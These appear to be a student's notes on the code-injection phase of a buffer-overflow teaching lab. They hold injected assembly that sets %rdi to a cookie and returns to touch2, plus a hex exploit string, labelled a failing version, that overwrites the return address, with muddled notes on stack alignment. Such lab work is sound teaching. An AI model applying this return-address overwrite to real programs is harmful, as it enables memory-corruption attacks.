
1. address pf #touch2# is #00000000004017ec#
2. in order to pass if statement, we need to set %rdi to 0x59b997fa
3. ret to touch2
   ``` asm
   mov $0x59b997fa,%rdi  # from ./cookie.txt
   push $0x4017ec   # push the touch2 address onto stack
   ret
   ```
4. $rsp - 0x28 = 0x5561DC78 the start address of getbuf
5. use "ret" instead of "pop", because return will transfer the control to the address on the top of the stack, and pop will remove the address on the top of the stack


## error version

48 c7 c7 fa 97 b9 59 # mov $0x59b997fa,%rdi
c3 # ret
01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 01 # 0x28
78 dc 61 55 00 00 00 00 # the bottom of the stack, in order to pass argument to touch2
ec 17 40 00 00 00 00 00 # when c3 is executed, the control will transfer to this address

will cause
``` asm
movaps %xmm1,0x10(%rsp)
```
to be executed, which will cause segmentation fault

'ret' == pop PC, PC = *rsp++, so rsp changed 

in touch2 func 
``` asm
sub $0x8, %rsp
```
and because we return 16, it overflow 8 bytes, so rsp changed

the way to fix it have two solutions:
1. reduce numbers of "ret", but can't set argument
2. both can onto stack and make --rsp, i.e. move argument to the top of the stack